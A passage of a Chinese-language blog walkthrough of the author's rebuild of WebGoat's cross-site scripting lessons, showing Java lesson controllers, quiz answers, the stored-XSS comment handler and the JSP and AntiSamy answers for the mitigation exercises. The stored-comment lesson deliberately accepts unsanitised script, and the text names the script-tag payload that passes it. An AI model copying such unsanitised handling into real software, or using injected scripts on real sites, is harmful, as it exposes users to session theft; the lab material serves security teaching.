<span class="literal">true</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    guesses[i] = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (correctAnswers == solutions.length)&#123;</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/CrossSiteScripting/quiz&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span>[] getResults() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.guesses;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>答案 4 3 1 2 4</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220910165049946.png" alt="image-20220910165049946"></p>
<h3 id="stored"><a href="#stored" class="headerlink" title="stored"></a>stored</h3><h4 id="CrossSiteScriptingStored"><a href="#CrossSiteScriptingStored" class="headerlink" title="CrossSiteScriptingStored"></a>CrossSiteScriptingStored</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.xss.stored;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CrossSiteScriptingStored</span> <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Category.A3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;xss-stored.title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="StoredXssComments"><a href="#StoredXssComments" class="headerlink" title="StoredXssComments"></a>StoredXssComments</h4><p>注意与原文的差异</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911115820497.png" alt="image-20220911115820497"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.xss.stored;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.core.JsonProcessingException;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> com.google.common.collect.Lists;</span><br><span class="line"><span class="keyword">import</span> com.headius.invokebinder.transform.Collect;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.WebSession;</span><br><span class="line"><span class="keyword">import</span> org.joda.time.DateTime;</span><br><span class="line"><span class="keyword">import</span> org.joda.time.format.DateTimeFormat;</span><br><span class="line"><span class="keyword">import</span> org.joda.time.format.DateTimeFormatter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.http.MediaType.ALL_VALUE;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StoredXssComments</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> WebSession webSession;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">DateTimeFormatter</span> <span class="variable">fmt</span> <span class="operator">=</span> DateTimeFormat.forPattern(<span class="string">&quot;yyyy-mm-dd, HH:mm:ss&quot;</span>);</span><br><span class="line"><span class="comment">//    创建时间格式化对象</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Map&lt;String , List&lt;Comment&gt;&gt; userComments = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="comment">//    用于存放用户评论的map</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;Comment&gt; comments = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"><span class="comment">//    存放评论的list</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">phoneHomeString</span> <span class="operator">=</span> <span class="string">&quot;&lt;script&gt;webgoat.customjs.phoneHome()&lt;/script&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//    这个是作为用户通关的条件</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        comments.add(<span class="keyword">new</span> <span class="title class_">Comment</span>(<span class="string">&quot;secUriTy&quot;</span>, DateTime.now().toString(fmt),<span class="string">&quot;&lt;script&gt;console.warn(&#x27; unit test me&#x27;)&lt;/script&gt;Comment for Unit Testing&quot;</span>));</span><br><span class="line">        comments.add(<span class="keyword">new</span> <span class="title class_">Comment</span>(<span class="string">&quot;webgoat&quot;</span>,DateTime.now().toString(fmt),<span class="string">&quot;This comment is safe&quot;</span>));</span><br><span class="line">        comments.add(<span class="keyword">new</span> <span class="title class_">Comment</span>(<span class="string">&quot;guest&quot;</span>,DateTime.now().toString(fmt),<span class="string">&quot;This one is safe too.&quot;</span>));</span><br><span class="line">        comments.add(<span class="keyword">new</span> <span class="title class_">Comment</span>(<span class="string">&quot;guest&quot;</span>,DateTime.now().toString(fmt),<span class="string">&quot;Can you post a comment, calling webgoat.customjs.phoneHome() ?&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@GetMapping(path = &quot;/CrossSiteScripting/stored-xss&quot;,produces = MediaType.APPLICATION_JSON_VALUE,consumes = ALL_VALUE)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> Collection&lt;Comment&gt; <span class="title function_">retrieveComments</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="comment">//        检索信息</span></span><br><span class="line">        List&lt;Comment&gt; allComments = Lists.newArrayList();</span><br><span class="line">        Collection&lt;Comment&gt; newComments = userComments.get(webSession.getUserName());</span><br><span class="line"><span class="comment">//        获取当前用户的所有评论</span></span><br><span class="line">        allComments.addAll(comments);</span><br><span class="line"><span class="comment">//        追加comments所有元素到allComments中去</span></span><br><span class="line">        <span class="keyword">if</span> (newComments != <span class="literal">null</span>) &#123;</span><br><span class="line">            allComments.addAll(newComments);</span><br><span class="line"><span class="comment">//            追加用户添加的评论</span></span><br><span class="line">        &#125;</span><br><span class="line">        Collections.reverse(allComments);</span><br><span class="line"><span class="comment">//        逆序评论</span></span><br><span class="line">        <span class="keyword">return</span> allComments;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/CrossSiteScripting/stored-xss&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">createNewComment</span><span class="params">(<span class="meta">@RequestBody</span> String commentStr)</span>&#123;</span><br><span class="line">        <span class="type">Comment</span> <span class="variable">comment</span> <span class="operator">=</span> parseJson(commentStr);</span><br><span class="line"><span class="comment">//        将评论反序列化回对象</span></span><br><span class="line">        List&lt;Comment&gt; comments = userComments.getOrDefault(webSession.getUserName(),<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;());</span><br><span class="line"><span class="comment">//        获取当前用户所有评论</span></span><br><span class="line">        comment.setDateTime(DateTime.now().toString(fmt));</span><br><span class="line"></span><br><span class="line">        comment.setUser(webSession.getUserName());</span><br><span class="line">        comments.add(comment);</span><br><span class="line">        userComments.put(webSession.getUserName(),comments);</span><br><span class="line">        <span class="keyword">if</span> (comment.getText().contains(phoneHomeString))&#123;</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;xss-stored-comment-success&quot;</span>).build();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;xss-stored-comment-failure&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> Comment <span class="title function_">parseJson</span><span class="params">(String comment )</span>&#123;</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line"><span class="comment">//        新建一个对象映射器</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> mapper.readValue(comment,Comment.class);</span><br><span class="line"><span class="comment">//            对这个comment 进行读值</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (JsonProcessingException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Comment</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Comment"><a href="#Comment" class="headerlink" title="Comment"></a>Comment</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.xss.stored;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Setter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.bind.annotation.XmlRootElement;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="meta">@Setter</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@XmlRootElement</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Comment</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String user;</span><br><span class="line">    <span class="keyword">private</span> String dateTime;</span><br><span class="line">    <span class="keyword">private</span> String text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="StoredCrossSiteScriptingVerifier"><a href="#StoredCrossSiteScriptingVerifier" class="headerlink" title="StoredCrossSiteScriptingVerifier"></a>StoredCrossSiteScriptingVerifier</h5><p>注意差异</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911120330288.png" alt="image-20220911120330288"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.xss.stored;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.UserSessionData;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StoredCrossSiteScriptingVerifier</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/CrossSiteScriptingStored/stored-xss-follow-up&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String successMessage)</span>&#123;</span><br><span class="line">        <span class="type">UserSessionData</span> <span class="variable">userSessionData</span> <span class="operator">=</span> getUserSessionData();</span><br><span class="line">        <span class="keyword">if</span> (successMessage.equals(userSessionData.getValue(<span class="string">&quot;randValue&quot;</span>).toString()))&#123;</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;xss-stored-callback-success&quot;</span>).build();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;xss-stored-callback-failure&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>存储进去后提交即可</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911120209677.png" alt="image-20220911120209677"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911120538752.png" alt="image-20220911120538752"></p>
<h4 id="CrossSiteScriptingMitigation"><a href="#CrossSiteScriptingMitigation" class="headerlink" title="CrossSiteScriptingMitigation"></a>CrossSiteScriptingMitigation</h4><p>注意与原文的差异</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220910165707983.png" alt="image-20220910165707983"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.xss;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CrossSiteScriptingMitigation</span> <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Category.A3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;xss-mitigation.title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CrossSiteScriptingLesson3"><a href="#CrossSiteScriptingLesson3" class="headerlink" title="CrossSiteScriptingLesson3"></a>CrossSiteScriptingLesson3</h4><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911120920537.png" alt="image-20220911120920537"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.xss;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentPath;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.jsoup.Jsoup;</span><br><span class="line"><span class="keyword">import</span> org.jsoup.nodes.Document;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(value = &#123;&quot;xss-mitigation-3-hint1&quot;, &quot;xss-mitigation-3-hint2&quot;, &quot;xss-mitigation-3-hint3&quot;, &quot;xss-mitigation-3-hint4&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CrossSiteScriptingLesson3</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/CrossSiteScripting/attack3&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String editor)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">unescapedString</span> <span class="operator">=</span> org.jsoup.parser.Parser.unescapeEntities(editor,<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//        取消html 实体字符的转义</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (editor.isEmpty())</span><br><span class="line">                <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;xss-mitigation-3-no-code&quot;</span>).build();</span><br><span class="line">            <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> Jsoup.parse(unescapedString);</span><br><span class="line"><span class="comment">//            将 html 字符解析为文档</span></span><br><span class="line">            String[] lines = unescapedString.split(<span class="string">&quot;&lt;html&gt;&quot;</span>);</span><br><span class="line"><span class="comment">//            以&lt;html&gt; 分割字符</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">include</span> <span class="operator">=</span> (lines[<span class="number">0</span>]);</span><br><span class="line">            <span class="type">String</span> <span class="variable">fistNameElement</span> <span class="operator">=</span> doc.select(<span class="string">&quot;body &gt; table &gt; tbody &gt; tr:nth-child(1) &gt; td:nth-child(2)&quot;</span>).first().text();</span><br><span class="line">            <span class="type">String</span> <span class="variable">lastNameElement</span> <span class="operator">=</span> doc.select(<span class="string">&quot;body &gt; table &gt; tbody &gt; tr:nth-child(2) &gt; td:nth-child(2)&quot;</span>).first().text();</span><br><span class="line"></span><br><span class="line">            <span class="type">Boolean</span> <span class="variable">includeCorrect</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="type">Boolean</span> <span class="variable">firstNameCorrect</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="type">Boolean</span> <span class="variable">lastNameCorrect</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">if</span> (include.contains(<span class="string">&quot;&lt;%@&quot;</span>) &amp;&amp; include.contains(<span class="string">&quot;taglib&quot;</span>) &amp;&amp; include.contains(<span class="string">&quot;uri=\&quot;https://www.owasp.org/index.php/OWASP_java_Encode_Project\&quot;&quot;</span>) &amp;&amp; include.contains(<span class="string">&quot;%&gt;&quot;</span>))&#123;</span><br><span class="line">                includeCorrect = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (fistNameElement.equals(<span class="string">&quot;$&#123;e:forHtml(param.first_name)&#125;&quot;</span>)) &#123;</span><br><span class="line">                firstNameCorrect = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (lastNameElement.equals(<span class="string">&quot;$&#123;e:forHtml(param.last_name)&#125;&quot;</span>))&#123;</span><br><span class="line">                lastNameCorrect = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (includeCorrect &amp;&amp; firstNameCorrect &amp;&amp; lastNameCorrect)&#123;</span><br><span class="line">                <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;xss-mitigation-3-success&quot;</span>).build();</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;xss-mitigation-3-failure&quot;</span>).build();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(e.getMessage()).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里是让我们写缓解措施 这里我们读读</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911122117941.png" alt="image-20220911122117941"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911122130960.png" alt="image-20220911122130960"></p>
<p>这里找到了缓解措施 我们直接抄 但是直接抄会出问题</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> contentType=<span class="string">&quot;text/html&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span><br><span class="line">&lt;%<span class="meta">@taglib</span> prefix=<span class="string">&quot;e&quot;</span> uri=<span class="string">&quot;https://www.owasp.org/index.php/OWASP_Java_Encoder_Project&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Using GET and POST Method to Read Form Data&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Using POST Method to Read Form Data&lt;/h1&gt;</span><br><span class="line">    &lt;table&gt;</span><br><span class="line">        &lt;tbody&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td&gt;&lt;b&gt;First Name:&lt;/b&gt;&lt;/td&gt;</span><br><span class="line">                &lt;td&gt;$&#123;e:forHtml(param.first_name)&#125;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td&gt;&lt;b&gt;Last Name:&lt;/b&gt;&lt;/td&gt;</span><br><span class="line">                &lt;td&gt;$&#123;e:forHtml(param.last_name)&#125;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">        &lt;/tbody&gt;</span><br><span class="line">    &lt;/table&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>一大一小 后面也不一样 直接复制了</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911123231379.png" alt="image-20220911123231379"></p>
<p>答案</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> contentType=<span class="string">&quot;text/html&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span><br><span class="line">&lt;%<span class="meta">@taglib</span> prefix=<span class="string">&quot;e&quot;</span> uri=<span class="string">&quot;https://www.owasp.org/index.php/OWASP_java_Encode_Project&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Using GET and POST Method to Read Form Data&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Using POST Method to Read Form Data&lt;/h1&gt;</span><br><span class="line">    &lt;table&gt;</span><br><span class="line">        &lt;tbody&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td&gt;&lt;b&gt;First Name:&lt;/b&gt;&lt;/td&gt;</span><br><span class="line">                &lt;td&gt;$&#123;e:forHtml(param.first_name)&#125;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td&gt;&lt;b&gt;Last Name:&lt;/b&gt;&lt;/td&gt;</span><br><span class="line">                &lt;td&gt;$&#123;e:forHtml(param.last_name)&#125;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">        &lt;/tbody&gt;</span><br><span class="line">    &lt;/table&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911123553828.png" alt="image-20220911123553828"></p>
<h4 id="CrossSiteScriptingLesson4"><a href="#CrossSiteScriptingLesson4" class="headerlink" title="CrossSiteScriptingLesson4"></a>CrossSiteScriptingLesson4</h4><p>注意差异</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911120959361.png" alt="image-20220911120959361"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.xss;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@AssignmentHints(value = &#123;&quot;xss-mitigation-4-hint1&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CrossSiteScriptingLesson4</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/CrossSiteScripting/attack4&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String editor2)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">editor</span> <span class="operator">=</span>editor2.replaceAll(<span class="string">&quot;\\&lt;.*?&gt;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="comment">//        进行了过滤</span></span><br><span class="line">        log.debug(editor);</span><br><span class="line">        <span class="keyword">if</span> ((editor.contains(<span class="string">&quot;Policy.getInstance(\&quot;antisamy-slashdot.xml\&quot;&quot;</span>) || editor.contains(<span class="string">&quot;.scan(newComment, \&quot;antisamy-slashdot.xml\&quot;&quot;</span>) || editor.contains(<span class="string">&quot;.scan(newComment, new File(\&quot;antisamy-slashdot.xml\&quot;)&quot;</span>)) &amp;&amp;</span><br><span class="line">                editor.contains(<span class="string">&quot;new AntiSamy();&quot;</span>) &amp;&amp;</span><br><span class="line">                editor.contains(<span class="string">&quot;.scan(newComment,&quot;</span>) &amp;&amp;</span><br><span class="line">                editor.contains(<span class="string">&quot;CleanResults&quot;</span>) &amp;&amp;</span><br><span class="line">                editor.contains(<span class="string">&quot;MyCommentDAO.addComment(threadID, userID&quot;</span>) &amp;&amp;</span><br><span class="line">                editor.contains(<span class="string">&quot;.getCleanHTML());&quot;</span>))&#123;</span><br><span class="line">            log.debug(<span class="string">&quot;true&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>  success(<span class="built_in">this</span>).feedback(<span class="string">&quot;xss-mitigation-4-success&quot;</span>).build();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            log.debug(<span class="string">&quot;false&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span 